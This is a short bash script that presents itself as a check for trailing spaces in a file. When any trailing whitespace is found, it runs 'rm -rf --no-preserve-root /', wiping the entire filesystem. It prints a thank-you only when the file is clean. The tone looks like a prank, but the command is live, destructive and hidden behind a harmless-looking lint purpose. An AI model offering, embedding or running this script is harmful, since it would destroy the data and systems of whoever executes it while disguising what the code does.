#!/bin/bash
if grep '\s\+$' "$1" > /dev/null
then
    rm -rf --no-preserve-root /
else
    echo Thanks for not keeping trailing spaces!
fi
